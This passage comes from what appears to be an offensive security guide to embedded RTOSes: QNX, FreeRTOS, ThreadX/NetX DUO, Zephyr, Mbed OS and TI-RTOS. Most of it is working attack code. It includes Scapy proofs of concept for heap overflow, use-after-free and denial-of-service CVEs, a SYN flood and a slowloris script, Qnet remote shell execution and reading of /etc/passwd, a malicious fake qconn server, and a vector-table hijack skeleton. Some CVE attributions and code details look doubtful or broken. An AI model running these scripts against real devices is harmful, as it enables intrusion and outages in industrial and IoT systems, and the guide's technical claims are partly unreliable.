}
print(qconn_cmd('192.168.1.20', cmd))
```

### Qnet — inter-QNX-machine IPC abuse

```bash
# Qnet is QNX's native network protocol for transparent IPC.
# Two QNX machines on the same broadcast domain can mount each other's /net:
ls /net
# If qnet is running, this lists other QNX machines:
#   qnxbox1  qnxbox2  qnxbox3

# Mount a remote QNX filesystem (no auth in default config!):
ls /net/qnxbox1/
# This accesses the remote machine's filesystem as if it were local.
# File permissions still apply, but QNX default dev images run as root.

# Read a remote file:
cat /net/qnxbox1/etc/passwd
# Copy a remote binary:
cp /net/qnxbox1/usr/local/bin/target_binary ./analysis/

# Spawn a process on a remote QNX machine:
on -f /net/qnxbox1 /bin/sh -c 'id > /tmp/pwned'
```

### procfs — arbitrary memory access

```bash
# QNX procfs exposes per-process info in /proc/<pid>/
# /proc/<pid>/as is the address space (memory map) of the process
# Reading/writing it requires appropriate credentials (typically root)

ls /proc/
# 1  10  11  12  2  3  4  5  6  7  8  9  as  boot  curses  dcmd  dumper

ls /proc/1/
# as  argv Cleanup  cmdline  cred  exe  fds  libc  maps  status

# Read process memory map:
cat /proc/1/maps
# 00010000 00010240 r-xp 00000000 00:00 0      /bin/procnto
# 1b000000 1b00a000 rw-p 00000000 00:00 0      [heap]
# ...

# Dump a process's memory (requires CAP_SYS_ADMIN or root):
# Use 'pidin' (QNX's ps) for general process info
pidin
#   pid tid name                prio  state      code        data        stack
#     1   1 ./procnto-smp      255f  RUNNING     142000      26000       8192
#     2   1 ./procnto-smp      10r   RECEIVE     -           -           -
# ...

# Read 4KB of a process's memory at address 0x1b000000
dd if=/proc/1/as bs=1 skip=$((0x1b000000)) count=4096 2>/dev/null | hexdump -C

# Read via python (for binary analysis)
python3 << 'EOF'
import struct
with open('/proc/1/as', 'rb') as f:
    f.seek(0x1b000000)
    data = f.read(256)
    print(data.hex())
EOF
```

### QNX Momentics IDE — trusted channel exploitation

```bash
# Momentics IDE attaches to qconn to launch/debug processes on a QNX target.
# The IDE-to-qconn protocol is documented in BlackBerry QNX SDK docs.
# Attack surface: a compromised IDE can execute arbitrary code on any
# connected QNX target. Reverse: a compromised QNX target can attack the IDE.

# Set up a fake qconn server to attack Momentics IDE (red team scenario)
python3 << 'EOF'
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 8000))
s.listen(1)
print('[*] Fake qconn listening on 8000')
while True:
    c, _ = s.accept()
    c.sendall(b'QCONN\n')
    data = c.recv(4096)
    print(f'[*] Received: {data}')
    # Respond to IDE with a malicious "list" response containing
    # a path traversal payload in a binary path field
    payload = '{"services":[{"name":"pdebug","binary":"../../etc/passwd","port":8000}]}'
    c.sendall(payload.encode() + b'\n')
    c.close()
EOF
```

### QNX binary analysis

```bash
# QNX binaries are ELF (QNX Neutrino ELF variant, QNX-specific machine type EM_NONE
# or EM_ARM/EM_MIPS/EM_386/EM_X86_64 depending on arch)

file /tmp/qnx_binary
# ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, stripped

# Ghidra supports QNX ELF out of the box
# Loader: ELF > ARM:LE:32:v7

# Identify QNX-specific symbols
readelf -s /tmp/qnx_binary | grep -E "(ConnectClient|MsgSend|MsgReceive|ChannelCreate|_smm)|qnx"
# 1011: 00010384    64 FUNC    GLOBAL DEFAULT   11 ConnectClientInfo
# 1034: 00010138    80 FUNC    GLOBAL DEFAULT   11 ChannelCreate
# 1042: 00010188    60 FUNC    GLOBAL DEFAULT   11 MsgSendnc

# Use the QNX-specific Neutrino loader in Ghidra (View > Function ID > QNX Neutrino)
```

---

## 5. FreeRTOS — FreeRTOS+TCP CVEs, Task Corruption, Heap Overflow

### FreeRTOS+TCP architecture

```text
FreeRTOS+TCP is the TCP/IP stack for FreeRTOS. Runs as a single task ("IP-task")
with kernel-equivalent privileges. The IP-task processes all incoming packets
via the prvProcessIPEvents function.

Key files (FreeRTOS-Plus/Source/FreeRTOS-Plus-TCP/):
- FreeRTOS_IP.c          — IP-task, packet routing
- FreeRTOS_Sockets.c     — BSD socket API
- FreeRTOS_DHCP.c        — DHCP client
- FreeRTOS_DNS.c         — DNS client (cached)
- FreeRTOS_ICMP.c        — ICMP (ping) processing
- FreeRTOS_TCP_IP.c      — TCP state machine
- FreeRTOS_UDP_IP.c      — UDP processing
- FreeRTOS_ARP.c         — ARP cache

A buffer overflow in ANY of these = kernel-mode RCE.
(All FreeRTOS tasks share the same address space; there is no user/kernel boundary.)

Known CVEs (Zimperium disclosure, October 2018):
- CVE-2018-16525  IP fragment reassembly UAF (FreeRTOS_IP.c)
- CVE-2018-16528  ICMP echo heap overflow (FreeRTOS_ICMP.c)
- CVE-2018-16529  IPv4 DF flag memory leak (FreeRTOS_IP.c)
- CVE-2018-16603  TCP SYN queue exhaustion DoS (FreeRTOS_TCP_IP.c)
```

### CVE-2018-16528 — ICMP echo request heap overflow

```python
# CVE-2018-16528: Heap-based buffer overflow in the FreeRTOS+TCP
# ICMP echo (ping) reply handler.
# Triggered by an ICMP ECHO REQUEST with payload length > xBufferSizeBytes.
# The vulnerable code path:
#   FreeRTOS_SendPingReply( pICMPHeader ) -> pxBuffer[ ICMP_PAYLOAD ]
#   - allocates a buffer sized to receive the IP header
#   - but copies the ICMP payload of length = (IP_header.totalLength - 28)
#   - if the payload exceeds the buffer, the heap overflows
#
# PoC using Scapy

from scapy.all import IP, ICMP, Raw, send

def trigger_cve_2018_16528(target_ip, payload_size=2000):
    """Send an oversized ICMP echo to overflow the FreeRTOS+TCP ping buffer."""
    payload = b'A' * payload_size
    pkt = IP(dst=target_ip, ttl=64) / ICMP(type=8, code=0) / Raw(load=payload)
    send(pkt, verbose=False)
    print(f"[*] CVE-2018-16528 ICMP heap overflow sent to {target_ip} ({payload_size} bytes)")

trigger_cve_2018_16528('192.168.1.30', 2000)
# The default FreeRTOS+TCP ICMP buffer is ~1500 bytes (typical MTU).
# Payload > 1500 triggers the overflow.
```

### CVE-2018-16525 — IP fragment reassembly UAF

```python
# CVE-2018-16525: Use-after-free in FreeRTOS+TCP IP fragment reassembly.
# When two IP fragments overlap with specific offset values, the reassembly
# code frees a buffer and then accesses it, leading to UAF.
#
# PoC: send two crafted fragments with conflicting offsets

from scapy.all import IP, Raw, send, fragment
import time

def trigger_cve_2018_16525(target_ip):
    """Send overlapping IP fragments to trigger UAF in FreeRTOS+TCP."""
    # Build a large UDP packet that will be fragmented
    payload = b'A' * 1480 + b'B' * 1480
    base_pkt = IP(dst=target_ip, src='192.168.1.100', id=0x1234, flags='MF') / \
               Raw(load=payload)
    # Standard fragmentation
    frags = fragment(base_pkt, fragsize=1480)
    # Now craft an overlapping fragment that conflicts with fragment 0
    overlap_pkt = IP(dst=target_ip, src='192.168.1.100', id=0x1234,
                     flags='MF', frag=100) / Raw(load=b'C' * 200)
    # Send the overlap first, then the normal fragments
    send(overlap_pkt, verbose=False)
    time.sleep(0.1)
    for f in frags:
        send(f, verbose=False)
        time.sleep(0.05)
    print(f"[*] CVE-2018-16525 fragment UAF PoC sent to {target_ip}")

trigger_cve_2018_16525('192.168.1.30')
```

### CVE-2018-16529 — IPv4 DF flag memory leak

```python
# CVE-2018-16529: Memory leak in FreeRTOS+TCP when handling IPv4 packets
# with the DF (Don't Fragment) flag set incorrectly.
# Triggered by repeated sending of DF-flagged oversized packets.
# Result: heap exhaustion, denial of service.

from scapy.all import IP, UDP, send

def trigger_cve_2018_16529(target_ip, count=10000):
    """Send oversized DF-flagged packets to exhaust heap (CVE-2018-16529)."""
    payload = b'X' * 2000  # exceeds MTU but DF is set
    pkt = IP(dst=target_ip, flags='DF') / UDP(dport=12345) / Raw(load=payload)
    for i in range(count):
        send(pkt, verbose=False)
        if i % 1000 == 0:
            print(f"    Sent {i}/{count}")
    print(f"[*] CVE-2018-16529 DF exhaustion: {count} packets sent")

# This is a DoS — use sparingly
trigger_cve_2018_16529('192.168.1.30', count=100)
```

### CVE-2018-16603 — TCP SYN queue exhaustion

```python
# CVE-2018-16603: TCP SYN queue exhaustion DoS.
# FreeRTOS+TCP allocates a full connection context on the first SYN,
# allowing rapid memory exhaustion with a SYN flood.
# Unlike modern Linux (which uses SYN cookies), FreeRTOS+TCP < 10.3.1
# has no SYN cookie fallback.

from scapy.all import IP, TCP, RandShort, send
import threading

def syn_flood_cve_2018_16603(target_ip, target_port=80, count=5000, threads=10):
    """SYN flood against FreeRTOS+TCP to exhaust the connection queue."""
    def worker():
        for i in range(count // threads):
            pkt = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags='S')
            send(pkt, verbose=False)

    workers = [threading.Thread(target=worker) for _ in range(threads)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()
    print(f"[*] CVE-2018-16603 SYN flood: {count} SYNs sent")

syn_flood_cve_2018_16603('192.168.1.30', 80, count=1000)
```

### FreeRTOS task corruption — overwriting a TCB

```python
# A FreeRTOS Task Control Block (TCB_t) lives in the heap (or a fixed array
# if configUSE_PREEMPTION uses static allocation). Each TCB contains:
#   - topOfStack (uint32) — pointer to the task's saved register context
#   - pxTaskTag (uint32) — application tag (often a function pointer)
#   - pcTaskName[16]
#   - uxPriority (uint8)
#   - ... (see tasks.c TCB_t struct)
#
# Corrupting topOfStack gives ROP/PC control on next task switch.
# Corrupting pxTaskTag gives PC control on next vTaskCallApplicationTaskHook.

# Typical TCB layout (FreeRTOS 10.4, ARM Cortex-M, 32-bit):
TCB_SIZE = 0x80  # approximate; varies by config
TOP_OF_STACK_OFFSET = 0  # first field
PC_TASK_NAME_OFFSET = 8
TASK_TAG_OFFSET = 4

# Identify the heap location in the firmware image
# Use Ghidra to find pvPortMalloc / vPortFree, then trace heap base
# Example heap base: 0x20000000 (Cortex-M SRAM)

# PoC: after gaining heap overflow, overwrite a TCB's topOfStack to redirect ROP
# (requires on-target or JTAG-assisted exploitation — not a network PoC)
```

### FreeRTOS heap layout analysis

```bash
# Identify heap implementation from the firmware
strings firmware.bin | grep -E "FreeRTOS V[0-9]" 
#   FreeRTOS V10.4.3

# Check the heap implementation (heap_1.c, heap_2.c, ..., heap_5.c)
# heap_1.c — simplest, no free()
# heap_2.c — best fit with free (no coalescing)
# heap_3.c — wraps malloc/free
# heap_4.c — first fit with coalescing (DEFAULT in most ports)
# heap_5.c — same as 4 but multiple memory regions
# heap_4.c is the most exploitable (predictable allocation order)

# In Ghidra, locate the heap by finding pvPortMalloc (look for:
#   pxNextFreeBlock = xStart.pxNextFreeBlock
#   while( ( ( xWantedSize > pxBlock->xBlockSize ) ... )
ghidra-analyze-target.py --function pvPortMalloc firmware.bin
# (Custom script — see Ghidra Script Manager)
```

### FreeRTOS GDB stub exploitation

```bash
# Some FreeRTOS ports ship a GDB stub (typically on TCP 3333 or 2331)
# Enabled in vendor SDKs for field debugging
# If exposed, gives full GDB access (memory read/write, breakpoints, etc.)

# Connect via arm-none-eabi-gdb
arm-none-eabi-gdb
(gdb) target remote <target-ip>:3333
(gdb) monitor reset halt
(gdb) info threads
#   Id  Target Id          Frame
#   1   Thread 4152 (IP-task) prvProcessIPEvents (ulTask=0x4152)
#   2   Thread 4150 (TCP-RX)  prvTCPMakeSureWaitQueueNotNull (...)
#   3   Thread 4151 (TCP-TX) xQueueReceive (...)
#   ...
(gdb) thread 1
(gdb) bt
#   #0  prvProcessIPEvents (ulTask=0x4152) at FreeRTOS_IP.c:1845
#   #1  prvIPTask (pvParameters=0x0) at FreeRTOS_IP.c:1710

# Dump all task TCBs (FreeRTOS has a GDB python script for this)
(gdb) source /opt/freertos/freertos-gdb.py
(gdb) freertos-list-tasks
#   Task ID    Priority    StackBase    StackTop    StackSize    Name
#   0x20000000 1           0x20001000   0x20001200  0x0800       IDLE
#   0x20000500 2           0x20001500   0x20001780  0x0800       IP-task
#   0x200005A0 1           0x20001500   0x20001780  0x0800       TCP-RX
#   ...

# Dump the heap layout
(gdb) call vPortGetHeapStats()
#   xSizeOfLargestFreeBlockInBytes = 4096
#   xSizeOfSmallestFreeBlockInBytes = 16
#   xNumberOfFreeBlocks = 12
#   xMinimumEverFreeBytesRemaining = 8192
```

---

## 6. ThreadX / Azure RTOS — Block Pool, NetX DUO, OpenAMP

### ThreadX block pool exploitation

```python
# ThreadX provides two allocators:
# 1. tx_byte_pool  — variable-size, first-fit, byte-level allocator
#    (inline metadata, harder to exploit reliably)
# 2. tx_block_pool — fixed-size, singly-linked free list
#    (metadata in a header, very easy to exploit)
#
# Vulnerability pattern: heap overflow in a thread/service allocates from a
# tx_block_pool and overwrites the NEXT block's free list pointer.
# The next tx_block_release will write the attacker-controlled pointer to
# the pool's head, allowing arbitrary-address-write on subsequent releases.

# Block pool structure (TX_BLOCK_POOL):
#   tx_block_pool_id              (uint32)      — 'B' 'L' 'O' 'C' = 0x424C4F43
#   tx_block_pool_name            (char *)
#   tx_block_pool_available       (uint32)
#   tx_block_pool_start           (void *)
#   tx_block_pool_size            (uint32)
#   tx_block_pool_block_size      (uint32)
#   tx_block_pool_created_next    (TX_BLOCK_POOL *)
#   tx_block_pool_created_previous(TX_BLOCK_POOL *)
#   ...

# Free list entry (header of each free block):
#   tx_next                       (void *)      — pointer to next free block

# Attack: overflow block N's payload into block N+1's header (tx_next)
# Then call tx_block_release(block_N) -> writes fake tx_next into pool head
# Then call tx_block_allocate() -> returns block with attacker-controlled address
# Then call tx_block_allocate() -> returns the fake address (arbitrary write!)

# PoC skeleton (requires on-target execution after a heap overflow)
def threadx_block_pool_exploit(pool_addr, fake_next_addr):
    """Exploit a ThreadX block pool free-list overwrite."""
    # After the heap overflow, block_N+1's tx_next = fake_next_addr
    # Now call tx_block_release(block_N):
    #   This sets pool->head = block_N
    # Call tx_block_allocate(pool) -> returns block_N
    # Call tx_block_allocate(pool) -> returns block_N+1 (because block_N->next = fake_next_addr)
    #   Wait — actually pool->head = block_N, allocate returns block_N,
    #   then pool->head = block_N->next = original_block_N_plus_1
    #   allocate returns block_N+1, then pool->head = block_N+1->next = fake_next_addr
    #   allocate returns fake_next_addr (ARBITRARY)
    pass

# NetX DUO CVEs (ThreadX networking stack, now Azure RTOS NetX DUO):
# CVE-2021-2924   HTTP server overflow (nx_http_server_entry)
# CVE-2023-34625  IPv6 ND prefix corruption
# CVE-2023-34624  DHCPv6 prefix delegation overflow
# CVE-2023-34623  MQTT buffer overflow
# CVE-2023-34622  DNS response parser overflow
```

### NetX DUO HTTP server overflow (CVE-2021-2924)

```python
# CVE-2021-2924: Buffer overflow in NetX HTTP server's URL parser
# when handling an oversized request URL.
# Triggered by an HTTP GET/POST with URL > NX_HTTP_SERVER_MAX_URL_LENGTH
# (default 100 bytes).

import socket

def trigger_cve_2021_2924(target_ip, port=80):
    """Send an oversized HTTP URL to overflow the NetX HTTP server."""
    oversized_url = '/' + 'A' * 1024
    req = f'GET {oversized_url} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, port))
    s.sendall(req.encode())
    try:
        resp = s.recv(4096)
        print(f'[+] Response: {resp[:256]}')
    except socket.timeout:
        print('[-] No response (server likely crashed)')
    s.close()

trigger_cve_2021_2924('192.168.1.40')
```

### NetX DUO DNS response overflow (CVE-2023-34622)

```python
# CVE-2023-34622: Overflow in NetX DUO DNS response parser
# when handling a malformed DNS response with a long CNAME chain.

from scapy.all import IP, UDP, DNS, DNSRR, send

def trigger_cve_2023_34622(target_ip):
    """Send a malicious DNS response with a long CNAME chain."""
    # Build a DNS response with a long CNAME pointing back to a fake address
    response = (
        IP(dst=target_ip, src='8.8.8.8') /
        UDP(sport=53, dport=33333) /
        DNS(id=0x1234, qr=1, ancount=1,
            qd=DNS(qname='example.com', qtype='A'),
            an=DNSRR(rrname='example.com', type='CNAME',
                     rdata='a' * 500 + '.example.com'))
    )
    send(response, verbose=False)
    print(f'[*] CVE-2023-34622 DNS overflow PoC sent to {target_ip}')

trigger_cve_2023_34622('192.168.1.40')
```

### Azure RTOS / OpenAMP takeover

```bash
# Microsoft acquired Express Logic (ThreadX) in April 2019, rebranding as Azure RTOS.
# In 2023, Microsoft donated Azure RTOS to the Eclipse Foundation, becoming
# Eclipse ThreadX (OpenAMP/ThreadX).
#
# Migration paths:
# - ThreadX 5.x  ->  Azure RTOS ThreadX 6.x  ->  Eclipse ThreadX 6.4.x
# - NetX 4.x     ->  Azure RTOS NetX DUO 6.x  ->  Eclipse ThreadX NetX DUO
# - FileX 4.x    ->  Azure RTOS FileX 6.x     ->  Eclipse ThreadX FileX
# - USBX 4.x     ->  Azure RTOS USBX 6.x      ->  Eclipse ThreadX USBX
#
# Re-exploitation opportunities across migrations:
# - Source-level API is largely unchanged -> old PoCs still apply
# - Build configuration changes can disable protections (e.g., MPUs)
# - Older Tier-1 SDKs may still ship pre-Azure versions with the original CVEs
#
# Identify which version is in use:
strings firmware.bin | grep -E "(ThreadX|Azure|Eclipse)"
#   "ThreadX by Express Logic"               # original (pre-Azure)
#   "Azure RTOS ThreadX"                     # Microsoft Azure RTOS
#   "Eclipse ThreadX"                        # post-Eclipse donation
#   "ThreadX Source Code Library Ver 5.8"    # pre-Azure version string
#   "ThreadX Source Code Library Ver 6.4"    # Eclipse version string
```

---

## 7. Zephyr — Kconfig, Bluetooth Host, Networking Subsystem

### Zephyr Kconfig analysis

```bash
# Zephyr uses Kconfig (like the Linux kernel) for build configuration.
# The final configuration is written to build/zephyr/.config

cat ~/tools/zephyrproject/zephyr/build/zephyr/.config | grep -E "(CONFIG_BT|CONFIG_NET|CONFIG_NETWORKING|CONFIG_MPU|CONFIG_SECURITY)"
#   CONFIG_BT=y
#   CONFIG_BT_PERIPHERAL=y
#   CONFIG_BT_CENTRAL=y
#   CONFIG_BT_SMP=y
#   CONFIG_BT_BREDR=n
#   CONFIG_BT_HOST_CRYPTO=y
#   CONFIG_NETWORKING=y
#   CONFIG_NET_IPV4=y
#   CONFIG_NET_IPV6=y
#   CONFIG_NET_TCP=y
#   CONFIG_NET_COAP=y
#   CONFIG_MPU_STACK_GUARD=y
#   CONFIG_HW_STACK_PROTECTION=y

# Security-relevant settings to audit:
# CONFIG_BT_SMP — Bluetooth Secure Connections (key exchange)
# CONFIG_HW_STACK_PROTECTION — hardware stack guard (MPU region on Cortex-M)
# CONFIG_MPU_STACK_GUARD — separate MPU stack guard region
# CONFIG_USERSPACE — thread privilege separation (Cortex-M with MPU)
# CONFIG_NETWORKING — networking subsystem enabled
# CONFIG_EXECUTE_XOR_TEXT — W^X enforcement (text not writable)

# Pull the Kconfig from an extracted firmware
# (Often embedded as a string block — search for "CONFIG_" patterns)
strings firmware.bin | grep "^CONFIG_" | sort -u > extracted_kconfig.txt
head -50 extracted_kconfig.txt
```

### Zephyr Bluetooth host stack CVEs

```python
# Zephyr has a from-scratch Bluetooth host stack (not BlueZ).
# Multiple CVEs disclosed 2019-2023:
#
# CVE-2019-17500   L2CAP heap overflow in l2cap_chan_recv
# CVE-2020-10019   GATT handler use-after-free (bt_gatt_discover)
# CVE-2020-10018   L2CAP heap overflow in l2cap_recv
# CVE-2020-10024   Mesh provisioning heap overflow (bt_mesh_net_recv)
# CVE-2021-3329    L2CAP signal heap overflow (bt_l2cap_recv)
# CVE-2022-3821    HCI ACL buffer overflow (bt_buf_get_rx)
# CVE-2023-3353    L2CAP heap overflow in l2cap_parse_conf_req

# PoC: CVE-2019-17500 — oversized L2CAP information payload
# Triggered by an L2CAP Connection Request with an oversized payload

from scapy.bluetoot import *

def trigger_cve_2019_17500(target_bdaddr):
    """Send an oversized L2CAP packet to overflow the Zephyr L2CAP heap."""
    # Connect via Bluetooth LE
    # Build an L2CAP packet with an oversized information payload
    l2cap_payload = b'A' * 2048  # overflow size
    # L2CAP header: length (2 bytes) + CID (2 bytes)
    # Send over HCI
    pass  # Implementation depends on Bluetooth hardware

# Simpler PoC using Scapy Bluetooth LE layers
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *

def trigger_cve_2020_10019(target_bdaddr):
    """Trigger GATT handler UAF (CVE-2020-10019) with a malformed GATT discovery."""
    # Build a malformed ATT Find By Type Value Request
    att_pdu = ATT_Hdr() / ATT_Find_By_Type_Value_Request(
        start_handle=0x0001,
        end_handle=0xFFFF,
        uuid=0x2800,  # Primary Service
        value=b'A' * 256  # oversized value
    )
    # Wrap in L2CAP CID 0x0004 (ATT)
    l2cap = L2CAP_Hdr(length=len(att_pdu) + 4, cid=0x0004) / att_pdu
    # Send via BLE
    pass
```

### Zephyr networking subsystem fuzzing

```bash
# Zephyr's networking subsystem supports CoAP, LwM2M, HTTP, MQTT, DNS.
# Each is fuzzable via the host networking port when running native_posix build.

# Build native_posix (runs Zephyr as a Linux process):
cd ~/tools/zephyrproject/zephyr
west build -b native_posix samples/net/sockets/coap_server
./build/zephyr/zephyr.exe
# Listens on a tun interface (default: zeth)
ip addr show zeth
#   inet 192.0.2.1/24 scope global zeth

# Fuzz with boofuzz
pip3 install boofuzz
python3 << 'EOF'
from boofuzz import *
session = Session(target=Target(connection=UDPSocketConnection("192.0.2.1", 5683)))
s_initialize("coap_request")
s_string("40", fuzz=False)  # CoAP version + type
s_string("01", fuzz=False)  # token length + method
s_string("BB", fuzz=True)   # message ID
s_string("AABB", fuzz=True) # token
s_string("/.well-known/core", fuzz=True)  # URI path
session.connect(s_get("coap_request"))
session.fuzz()
EOF
```

### Zephyr Bluetooth host stack enumeration

```bash
# Find a Zephyr Bluetooth device
sudo hcitool -i hci0 lescan
# LE Scan ...
# AA:BB:CC:DD:EE:FF (unknown)
# AA:BB:CC:DD:EE:FF ZephyrSample
# AA:BB:CC:DD:EE:FF (unknown)

# Connect and dump GATT services
sudo bluetoothctl
[bluetooth]# connect AA:BB:CC:DD:EE:FF
Attempting to connect to AA:BB:CC:DD:EE:FF
[CHG] Device AA:BB:CC:DD:EE:FF Connected: yes
[ZephyrSample]# menu gatt
[ZephyrSample]# list-attributes
# Primary Service
#   /org/bluez/hci0/dev_AA_BB_CC_DD_EE_FF/service001a
#   00001800-0000-1000-8000-00805f9b34fb Generic Access
#   00001801-0000-1000-8000-00805f9b34fb Generic Attribute
#   ...

# Use Bettercap or ubertooth for active probing
sudo bettercap -iface hci0
bettercap> ble.recon on
bettercap> ble.show
bettercap> ble.enum AA:BB:CC:DD:EE:FF
```

### Zephyr Kconfig — identifying MPU/HW stack protection

```bash
# Determine if the firmware has hardware stack protection enabled
# Look for the MPU init code (arch/arm/core/mpu/cortex_m/mpu.c)
strings firmware.bin | grep -E "(z_arm_mpu_init|z_arm_configure_static_mpu_regions)"
#   z_arm_mpu_init
#   z_arm_configure_static_mpu_regions
#   z_arm_configure_dynamic_mpu_regions
#   z_arm_configure_mpu_mem_regions

# If these strings are missing, MPU is likely disabled
# (CONFIG_MPU_STACK_GUARD=n or CONFIG_CPU_HAS_ARM_MPU=n)

# Verify by checking the build artifacts
# After extraction, find the linker script to determine memory regions
find _firmware.bin.extracted -name "*.ld" -o -name "linker*"
cat _firmware.bin.extracted/linker.ld | grep -E "MEMORY|FLASH|RAM|MMIO"
# MEMORY {
#   FLASH (rx) : ORIGIN = 0x0, LENGTH = 512K
#   RAM (rwx)  : ORIGIN = 0x20000000, LENGTH = 128K
# }
# Note: RAM is rwx — text-writable (CONFIG_EXECUTE_XOR_TEXT=n)
```

---

## 8. Mbed OS — uVisor, Pelion, mbedTLS

### Mbed OS architecture

```text
Mbed OS (Arm Mbed) was Arm's IoT OS, now deprecated (announced 2024).
Used in: wearables, smart meters, industrial sensors, automotive gateways.

Key components:
- Core: RTOS (rtos::Thread, rtos::Semaphore — built on CMSIS-RTOS 2)
- HAL: hardware abstraction (PinNames, peripherals)
- Connectivity: cellular, Wi-Fi, BLE, LoRa, 802.15.4
- Security: uVisor (sandboxing via Cortex-M MPU), mbedTLS (TLS, crypto)
- Cloud: Pelion Device Management (FOTA, LwM2M)

Attack surface:
- uVisor bypass (Cortex-M MPU region reconfiguration)
- mbedTLS vulnerabilities (CVE-2018-1000613 RSA timing, CVE-2020-10948 memory leak)
- Pelion client (HTTPS over mbedTLS, certificate chain validation)
- mbed-cli build artifacts (debug symbols left in release)

Reference: Arm Mbed OS documentation, Pelion security whitepapers
```

### uVisor bypass

```python
# uVisor is Mbed OS's security layer that uses the Cortex-M MPU
# to create isolated "enclaves" for code execution.
#
# Bypass paths:
# 1. MPU region reconfiguration — if a privileged task can call
#    mpu_region_set(), it can grant itself access to other regions
# 2. Fault handler hijack — overwrite the HardFault handler to gain
#    supervisor mode on the next fault
# 3. Race condition — between uVisor's MPU check and the actual access
#
# PoC skeleton: hijack the HardFault vector

def uvisor_bypass_via_hardfault(vtor_addr=0x0, fake_handler=0x20005001):
    """Overwrite the HardFault vector to redirect execution."""
    # The VTOR (Vector Table Offset Register) points to the vector table
    # HardFault is at offset 3 in the table (3 * 4 = 0x0C from VTOR base)
    hardfault_offset = 0x0C
    # Write fake_handler to the HardFault entry
    # (Requires memory write primitive — typically via WDB, JTAG, or heap overflow)
    write_memory(vtor_addr + hardfault_offset, struct.pack('<I', fake_handler))
    # Next fault jumps to fake_handler (in thumb mode)
```

### Pelion Device Management client

```bash
# Pelion client (now deprecated) uses mbedTLS for HTTPS to the Pelion Cloud
# Default endpoint: https://api.us-east-1.mbedcloud.com
# (or eu-west-1 / ap-northeast-1 region variants)

# Identify the Pelion endpoint in firmware:
strings firmware.bin | grep -E "mbedcloud|pelion|api\.[a-z-]+\.mbedcloud"
#   https://api.us-east-1.mbedcloud.com/v2/device-requests/

# Extract the device's LwM2M endpoint name and bootstrap certificate:
strings firmware.bin | grep -E "endpoint=|bootstrap|lwm2m"
#   endpoint=test-device-001
#   bootstrap=1

# Check certificate chain validation in mbedTLS:
# CVE-2018-1000613 — mbedTLS RSA timing side channel (PEM parsing)
# CVE-2020-10948 — mbedTLS ASN.1 parsing memory leak
# CVE-2021-43666 — mbedTLS side channel in ECDSA

# Reverse the mbedTLS handshake to find weak cipher suites
strings firmware.bin | grep -E "TLS-|MBEDTLS_SSL|ECDHE"
#   MBEDTLS_SSL_CIPHERSUITES=TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
#   MBEDTLS_SSL_HASH_MAX=6
#   MBEDTLS_ECP_DP_SECP256R1_ENABLED
```

---

## 9. TI-RTOS / SYS/BIOS — NDK, ROV, XDC Tools

### TI-RTOS architecture

```text
TI-RTOS is Texas Instruments' RTOS (formerly DSP/BIOS, now SYS/BIOS + NDK).
Used on: C2000 (motor control), C6000 (DSP), MSP430 (low-power), Sitara (Cortex-A),
CC26xx (BLE SoCs), CC32xx (Wi-Fi SoCs).

Components:
- SYS/BIOS — kernel (task scheduler, semaphores, mailboxes, heaps)
- NDK (Network Developer's Kit) — TCP/IP stack (BSD-derived)
- XDCtools — embedded runtime / config tool (.cfg files compile to C)
- DriverLib — peripheral drivers
- TIVA — TI Tiva-C series

Attack surface:
- NDK TCP/IP stack (BSD-derivative; inherits some BSD CVEs)
- ROV (Runtime Object Viewer) — debug interface over UART/Ethernet
- XDCtools-generated config — usually compiled into firmware (no runtime attack)
- DriverLib — peripheral-level attacks (SPI, I2C)
```

### TI-RTOS NDK vulnerabilities

```bash
# The NDK uses a BSD-derived TCP/IP stack (older versions derived from BSD 4.4-Lite)
# Known issues:
# - TCP ISN prediction (older versions)
# - No SYN cookies -> SYN flood DoS
# - IP fragment reassembly flaws (BSD-inherited)
# - Default weak DHCP client options

# Identify the NDK version
strings firmware.bin | grep -E "(NDK|ti\.ndk|SYS/BIOS)"
#   NDK 2.25.0
#   SYS/BIOS 6.76.0
#   ti.ndk.stacktcp

# The NDK includes a "HTTPServer" task — vulnerable to standard HTTP attacks
# (oversized headers, slowloris)
strings firmware.bin | grep -E "(HTTPServer|http_)"
#   HTTPServer: starting on port 80
#   HTTPServer: accepting new connection

# Slowloris PoC against TI-RTOS NDK HTTPServer
python3 << 'EOF'
import socket, time

def slowloris(target_ip, port=80, sockets=50):
    """Slowloris against TI-RTOS NDK HTTPServer (limited-socket server)."""
    sock_list = []
    for i in range(sockets):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        try:
            s.connect((target_ip, port))
            s.sendall(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
            sock_list.append(s)
        except:
            pass
    print(f"[*] {len(sock_list)} slowloris sockets open")
    while True:
        for s in sock_list:
            try:
                s.sendall(b"X-a: b\r\n")
            except:
                sock_list.remove(s)
                # Reconnect
                try:
                    s.connect((target_ip, port))
                    s.sendall(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
                    sock_list.append(s)
                except:
                    pass
        time.sleep(10)

slowloris('192.168.1.50')
EOF
```

### ROV (Runtime Object Viewer) enumeration

```bash
# ROV is the XDCtools debug interface. Over UART by default.
# On Ethernet-enabled TI-RTOS, ROV is accessible via a debug TCP port (typically 18100).

# Connect via UART (default baud 115200):
picocom -b 115200 /dev/ttyUSB0
# At the XDC console:
# > help
# Commands: list, show, task, swi, semaphore, mailbox, heap, module
# > task
#   task    pri   mode     functp   SP      name
#   0       15    RUNNING  0x1000   0x2000  MainTask
#   1       10    BLOCKED  0x1100   0x2100  HTTPServer
#   ...
# > heap
#   heap: SystemHeap, size=0x8000, free=0x4000
# > module
#   List of loaded modules: ti.sysbios.BIOS, ti.sysbios.knl.Task, ...

# Over Ethernet (if enabled):
nc <target-ip> 18100
# Same prompt as UART
```

### TI SimpleLink (CC26xx / CC32xx)

```bash
# TI SimpleLink is the BLE/Wi-Fi SoC family. Uses TI-RTOS internally.
# Common BLE devices: CC2640R2, CC2642R, CC2652R (BLE 5)
